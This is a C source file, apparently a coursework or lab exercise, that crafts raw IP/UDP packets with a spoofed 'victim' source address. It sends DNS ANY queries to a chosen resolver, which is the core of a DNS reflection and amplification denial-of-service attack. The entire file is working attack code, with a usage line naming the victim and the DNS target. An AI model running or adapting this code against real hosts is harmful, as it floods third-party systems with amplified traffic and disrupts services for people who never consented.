
#include <stdio.h>
#include <sys/socket.h>   
#include <netinet/in.h>   
#include <netdb.h>   
#include <arpa/inet.h>

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/udp.h>


// DNS header struct
typedef struct
{
	unsigned short id; 		// ID
	unsigned short flags;	// DNS Flags
	unsigned short qcount;	// Question Count
	unsigned short ans;		// Answer Count
	unsigned short auth;	// Authority RR
	unsigned short add;		// Additional RR
}dns_hdr;

// Question types
typedef struct
{
	unsigned short qtype;
	unsigned short qclass;
}query;

// Taken from http://www.binarytides.com/dns-query-code-in-c-with-linux-sockets/
void dns_format(unsigned char * dns,unsigned char * host) 
{
	int lock = 0 , i;
	strcat((char*)host,".");
	for(i = 0 ; i < strlen((char*)host) ; i++) 
	{
		if(host[i]=='.') 
		{
            *dns++ = i-lock;
            for(;lock<i;lock++) 
            {
                *dns++=host[lock];
            }
            lock++;
            
		}
	}
	*dns++=0;
    //printf("dns::%s\n", dns);
}


int main(int argc,char**argv)
{
	if(argc != 6 ){
		printf("format: <victim hostname/IP> <victim port> <dns hostname/IP> <dns port> <query>\n");
		return 0;
	}
    for(int i=0; i<6; i++){
        //printf("argv[%d] : %s\n", i, argv[i]);
    }

    int addlen = 2;
  	
    int iplen = sizeof(struct iphdr);
    int udplen = sizeof(struct udphdr);
	int dnslen = sizeof(dns_hdr);
    int namelen = strlen(argv[5])+addlen;
    int querylen = sizeof(query);

    int iptot = iplen + udplen + querylen + namelen + dnslen;

    char* data = (char*)malloc(iptot);
    dns_hdr * dns = (dns_hdr *) &(data[iptot - dnslen - namelen - querylen]);
    unsigned char* name = (unsigned char *) &(data[iptot - namelen - querylen]);
    query * q = (query *) &(data[iptot - querylen]);
    struct udphdr * udph = (struct udphdr *)&(data[iplen]);
    struct iphdr *iph = (struct iphdr *)&(data[0]);
    
    /*
    char data[128];
    dns_hdr * dns = (dns_hdr *) (data+28);
    unsigned char* name = (unsigned char *) &(data[sizeof(struct iphdr) + sizeof(struct udphdr)+sizeof(dns_hdr)]);
    query * q = (query *) &(data[sizeof(struct iphdr) + sizeof(struct udphdr)+sizeof(dns_hdr)+(sizeof(char)*(strlen(argv[5])+addlen))]);
    struct udphdr * udph = (struct udphdr *) (data+20);
    struct iphdr *iph = (struct iphdr *) data;
    */
    

    
  //dnshder
   
    dns->id = (unsigned short) htons(getpid());
	dns->flags = htons(0x0100);
	dns->qcount = htons(1);
	dns->ans = 0;
	dns->auth = 0;
	//dns->add = htons(1);//!
    dns->add = 0;
  //dns_name
	
	dns_format(name,(unsigned char *) argv[5]);
    //printf("name::%s\n", name);	
  //dns query
	
	q->qtype = htons(0x00ff);
	q->qclass = htons(0x0001);   
  //udphdr
    
    udph->source = htons(atoi(argv[2]));//victim_port
    udph->dest   = htons(atoi(argv[4]));//dns_port
    udph->len = htons(iptot - iplen);
    udph->check = 0;

  //iphdr
	iph->version = 4;
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = htons(iptot);
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr(argv[1]);//victim_ip
    iph->daddr = inet_addr(argv[3]);//dns_ip
	iph->check = 0;
  //socket  
	int sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
	//int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(sd < 0) {
    	//error("Could not create socket.");
    	printf("Could not create socket.\n" );
    }
    else {
        int one = 1;
        const int *val = &one;
        // Inform the kernel do not fill up the packet structure. we will build our own...
        if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
        {
            perror("setsockopt() error");
            return -1;
        }
        else{
            printf("setsockopt() is OK.\n");
        }

    	struct sockaddr_in sin;
    	sin.sin_family = PF_INET;
    	sin.sin_port = htons(atoi(argv[4]));//dns_port
    	sin.sin_addr.s_addr = inet_addr(argv[3]);//dns_ip
        printf("set sin\n");

        int datalen = iptot;
        //int datalen = sizeof(struct iphdr)+sizeof(struct udphdr)+sizeof(dns_hdr);

        //for(int i=0; i<5; i++){

        	int s = sendto(sd, data, datalen, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr_in));
            if(s<0) {
        		printf("Could not sent packet.\n" );
        		perror("Error");
                printf("iph->tot_len : %d\n", iph->tot_len);
        	}
        	else printf("sentto() sucess.\n");          
        //}
    }
}

/*
argv
strlen(argv[4])+3 ? why not 2
ip_offset
*/